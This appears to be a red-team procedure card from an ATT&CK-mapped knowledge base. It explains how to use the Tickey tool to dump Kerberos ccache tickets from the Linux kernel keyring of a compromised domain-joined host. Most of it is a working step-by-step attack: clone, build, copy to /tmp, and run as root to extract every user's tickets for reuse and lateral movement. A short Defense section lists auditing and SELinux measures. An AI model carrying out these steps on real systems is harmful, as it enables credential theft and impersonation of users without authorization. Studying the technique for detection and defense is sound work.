---
id: 6ddb46bd-ec8a-4688-bea0-0b846cf7c985
name: extract-ccache-tickets-from-linux-keyring-with-tickey
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.573574+00:00'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
techniques:
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
sub_techniques:
  - >-
    [[sub-techniques/Steal or Forge Kerberos Tickets: .ccache Files|T1558.004 -
    .ccache Files]]
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Kerberos Ticket Extraction]]'
  - '[[tags/Linux Credential Dumping]]'
commands:
  - '[[commands/git-clone-tickey-repository]]'
  - '[[commands/cd-to-tickey-directory]]'
  - '[[commands/make-release-build-of-tickey]]'
  - '[[commands/copy-tickey-binary-to-tmp]]'
  - '[[commands/run-tickey-to-extract-tickets]]'
platforms:
  - Linux
tools:
  - '[[tools/tickey]]'
validated: true
---

# Extract CCACHE Tickets from Linux Keyring with Tickey

## Summary

This procedure uses the Tickey tool to extract Kerberos CCACHE tickets stored in the Linux kernel keyring, allowing attackers to reuse them for unauthorized access to services, privilege escalation, or lateral movement in Kerberos-enabled environments like Active Directory domains.

## Description

Kerberos tickets, including CCACHE files, are often cached in the Linux keyring for seamless authentication. Attackers with access to a compromised Linux host can use Tickey to dump these tickets from memory, particularly effective on systems using keyring-based storage (e.g., KEYRING:session:sess_%{uid}). The extracted tickets can then be imported into tools like kinit for reuse. This technique targets environments with weak process isolation or root access, enabling impersonation of users without knowing their passwords. It is commonly used post-initial access on domain-joined Linux servers.

## Requirements

1. Root or administrator privileges on a Linux target system with Kerberos configured (e.g., SSSD or MIT Kerberos).
2. Git and Make installed for building Tickey (common on most distributions).
3. Network access to the GitHub repository for cloning Tickey.
4. Target system using keyring for CCACHE storage (verifiable via `klist` showing KEYRING: prefix).

## Defense

- Enable kernel keyring auditing and monitor for unauthorized key dumps using tools like auditd.
- Implement AppArmor or SELinux policies to restrict access to keyring operations.
- Rotate Kerberos tickets frequently and use ticket lifetimes under 10 hours.
- Detect anomalous kinit usage or ticket imports via centralized logging (e.g., Windows Event ID 4769 for Kerberos service ticket requests).

## Objectives

1. Clone and build the Tickey tool on the target system.
2. Extract CCACHE tickets from all user sessions in the kernel keyring.
3. Save tickets to files for offline reuse or import into attack tools.
4. Enable subsequent actions like service access or lateral movement using stolen tickets.

## Instructions

### Step 1: Clone the Tickey Repository

**Context**: Download the source code for Tickey from its official GitHub repository to prepare for building the tool locally on the target Linux system.

**Command** ([[commands/git-clone-tickey-repository]]):
```bash
git clone https://github.com/TarlogicSecurity/tickey
```

> This command fetches the Tickey source code into a new directory named 'tickey'. Ensure git is installed; if not, install via package manager (e.g., `apt install git` on Debian-based systems). Expected output includes cloning progress and a success message like "Cloning into 'tickey'...".

### Step 2: Navigate to the Build Directory

**Context**: Change into the Tickey source directory to access the build files and Makefile.

**Command** ([[commands/cd-to-tickey-directory]]):
```bash
cd tickey/tickey
```

> This positions the shell in the correct subdirectory containing the source and build scripts. Verify with `pwd` showing a path ending in '/tickey/tickey'. No output beyond shell prompt change.

### Step 3: Build the Release Version of Tickey

**Context**: Compile the Tickey binary in release mode for optimal performance and to generate the executable needed for ticket extraction.

**Command** ([[commands/make-release-build-of-tickey]]):
```bash
make CONF=Release
```

> This invokes the Makefile to build the tool. Ensure dependencies like a C compiler (gcc) are installed. Expected output includes compilation logs ending with no errors, producing the 'tickey' binary in the current directory.

### Step 4: Copy the Binary to /tmp for Execution

**Context**: Move the compiled Tickey binary to /tmp to facilitate execution from a neutral location, avoiding permission issues in the source directory.

**Command** ([[commands/copy-tickey-binary-to-tmp]]):
```bash
cp tickey /tmp/tickey
chmod +x /tmp/tickey
```

> This copies and makes the binary executable. /tmp is often writable without restrictions. Expected output: No verbose output, but verify with `ls -l /tmp/tickey` showing executable permissions.

### Step 5: Run Tickey to Extract Tickets

**Context**: Execute Tickey with the inject flag to dump Kerberos tickets from the kernel keyring across all user sessions, especially effective with root privileges to access all UIDs.

**Command** ([[commands/run-tickey-to-extract-tickets]]):
```bash
/tmp/tickey -i
```

> The -i flag initiates injection and dumping mode. Run as root for full access (`sudo /tmp/tickey -i`). Expected output includes detection of keyring type (e.g., "krb5 ccache_name = KEYRING:session:sess_%{uid}"), success messages for each session (e.g., "[+] Successful injection at process PID of user[UID], look for tickets in /tmp/__krb_UID.ccache"), and any errors for inaccessible sessions.
